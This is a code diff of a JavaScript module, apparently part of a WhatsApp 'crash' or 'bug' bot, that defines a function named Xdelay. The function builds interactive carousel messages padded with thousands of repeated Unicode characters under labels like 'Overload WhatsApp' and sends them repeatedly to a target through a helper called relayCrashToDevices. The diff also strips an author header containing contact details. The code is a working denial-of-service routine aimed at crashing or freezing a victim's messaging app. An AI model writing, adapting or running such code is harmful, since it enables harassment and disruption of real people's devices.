@@ -1,39 +1,14 @@
 const { relayCrashToDevices } = require('../target-utils');
-/*
- * © 2026 SeXyxeon (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/@voidsec7718
- * Instagram : sabir._7718
- * Telegram  : https://t.me/SABIR7718
- * GitHub    : https://github.com/SABIR7718
- * WhatsApp  : +91 73650 85213
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
 async function Xdelay(SYxS7, target) {
-    const totalPushes = 5;
+    let totalDelivered = 0;
+    const errors = [];
+    const totalPushes = 3;
 
     for (let i = 0; i < totalPushes; i++) {
         const push = [];
 
-        for (let k = 0; k < 500; k++) {
+        for (let k = 0; k < 10; k++) {
             push.push({
                 body: {
                     text: 'Overload WhatsApp'
@@ -65,13 +40,13 @@ async function Xdelay(SYxS7, target) {
             });
         }
 
-        const carousel = generateWAMessageFromContent(target, {
+        const carousel = {
             interactiveMessage: {
                 header: {
                     hasMediaAttachment: false,
                 },
                 body: {
-                    text: '🚩 TrashSuperior Overload ' + "ꦾ".repeat(5000),
+                    text: '🚩 TrashSuperior Overload ' + "ꦾ".repeat(1000),
                 },
                 footer: {
                     text: 'Trash Superior',
@@ -80,27 +55,32 @@ async function Xdelay(SYxS7, target) {
                     cards: [...push],
                 },
             }
-        }, {
-            userJid: target
-        });
+        };
 
-        // Send via groupStatusMessageV2 wrapper as well as direct interactiveMessage using multi-tier fallback
         try {
-            await relayCrashToDevices(SYxS7, target, {
+            const res1 = await relayCrashToDevices(SYxS7, target, {
                 groupStatusMessageV2: {
-                    message: carousel.message
+                    message: carousel
                 }
             });
+            if (res1.success) totalDelivered += res1.deliveredCount; else errors.push(...res1.errors);
         } catch (e) {
-            console.error(`[Xdelay status wrapper ${i + 1}]:`, e.message);
+            errors.push(`[Xdelay status wrapper ${i + 1}]: ${e.message}`);
         }
 
         try {
-            await relayCrashToDevices(SYxS7, target, carousel.message);
+            const res2 = await relayCrashToDevices(SYxS7, target, carousel);
+            if (res2.success) totalDelivered += res2.deliveredCount; else errors.push(...res2.errors);
         } catch (e) {
-            console.error(`[Xdelay direct interactive ${i + 1}]:`, e.message);
+            errors.push(`[Xdelay direct interactive ${i + 1}]: ${e.message}`);
         }
     }
+
+    return {
+        success: totalDelivered > 0,
+        deliveredCount: totalDelivered,
+        errors
+    };
 }
 
 module.exports = { Xdelay };
